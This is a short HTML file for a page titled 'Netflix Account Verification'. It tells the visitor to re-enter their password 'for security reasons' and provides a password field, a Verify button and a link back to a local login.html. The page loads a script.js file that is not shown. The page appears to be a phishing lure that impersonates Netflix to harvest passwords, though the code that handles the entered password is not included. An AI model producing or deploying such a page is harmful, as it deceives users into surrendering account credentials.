<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix Account Verification</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h2>Verify Your Netflix Account</h2>
        <p>For security reasons, please verify your password to continue.</p>
        <input type="password" id="password" class="input-field" placeholder="Enter your password">
        <button id="verifyBtn">Verify</button>
        <p class="error-message" id="error"></p>
        <a href="login.html">Back to Login</a>
    </div>
    
    <script src="script.js"></script>
</body>
</html>
